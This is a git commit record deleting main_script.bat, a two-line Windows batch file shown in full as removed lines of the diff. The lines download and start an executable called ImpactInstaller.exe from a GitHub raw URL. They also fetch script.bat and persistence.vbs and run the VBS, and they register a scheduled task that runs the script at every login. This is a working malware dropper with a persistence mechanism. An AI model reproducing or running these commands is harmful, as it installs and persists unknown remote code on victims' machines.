8adfd40dceff024438baac3bbe2dcf90f067ed7c
ishanarya24 <91789624+ishanarya24@users.noreply.github.com>
2021-10-21 02:57:52 +0530

    Delete main_script.bat

--- main_script.bat
+++
@@ -1,2 +0,0 @@
-curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe & cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs
-SCHTASKS /CREATE /SC ONLOGIN /TN "extraTask\task_99078" /TR %appdata%\script.bat
